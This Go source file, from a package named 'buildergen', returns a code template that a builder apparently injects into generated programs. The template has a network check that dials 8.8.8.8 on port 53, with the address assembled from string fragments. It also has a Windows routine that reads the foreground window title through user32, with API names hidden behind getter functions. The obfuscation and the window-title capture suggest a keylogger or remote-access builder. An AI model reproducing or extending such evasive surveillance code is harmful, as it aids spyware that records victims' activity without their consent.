package buildergen

import "strings"

func templateNet() string {
	return strings.TrimSpace(`
func hasNetwork() bool {
	if runtime.GOOS != "windows" && runtime.GOOS != "linux" && runtime.GOOS != "darwin" {
		return true
	}

	host := "8" + "." + "8" + "." + "8" + "." + "8"
	addr := host + ":" + "53"
	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func getActiveWindow() string {
	if runtime.GOOS != "windows" {
		return getUnknownWindowLabel()
	}
	user32 := syscall.NewLazyDLL(getUser32DLL())
	getForegroundWindow := user32.NewProc(getGetForegroundWindowName())
	getWindowText := user32.NewProc(getGetWindowTextWName())
	getWindowTextLength := user32.NewProc(getGetWindowTextLengthWName())

	hwnd, _, _ := getForegroundWindow.Call()
	if hwnd == 0 {
		return getNoActiveWindowLabel()
	}
	length, _, _ := getWindowTextLength.Call(hwnd)
	if length == 0 {
		return getUntitledWindowLabel()
	}
	buf := make([]uint16, length+1)
	getWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(length+1))
	return syscall.UTF16ToString(buf)
}
`)
}